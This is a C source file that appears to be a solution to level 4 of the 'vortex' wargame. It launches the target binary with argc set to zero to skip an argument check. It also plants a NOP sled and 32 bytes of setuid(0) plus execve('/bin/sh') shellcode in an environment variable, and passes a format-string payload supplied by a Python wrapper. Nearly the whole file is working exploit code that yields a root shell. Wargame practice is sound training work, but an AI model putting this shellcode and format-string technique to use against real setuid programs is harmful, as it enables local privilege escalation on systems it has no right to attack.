/*
 * Wrapper over vortex 4 binary: 
 *  - byapss first argc check
 *  - pass shellcode in environment variable
 *  - receive format string from python wrapper (.. easier) 
 */

#include <stdio.h>
#include <string.h>

/* 32 bytes setuid(0) + execve("/bin/sh",["/bin/sh",NULL]); */
char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" 
        "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" 
        "\x89\xe1\xcd\x80";

char padding[500];
char NOP = '\x90';
int nops = 500;

int main(int argc, char **args) {
	char exe[] = "/vortex/vortex4";
	char sh[600] = {0};
	
	// Fill with lots of NOPs to make sure we reach the shellcode
	memset(padding, NOP, nops);
	
	memcpy(sh, padding, nops);
	memcpy(sh+nops, shellcode, strlen(shellcode));
	
	// argc wil be 0, because argv[0] is not set
	char* argv[] = { NULL };	
	char* env[] = {"env0", "env1", args[1], sh, NULL};

	execve(exe, argv, env);
	
	return 0;
}
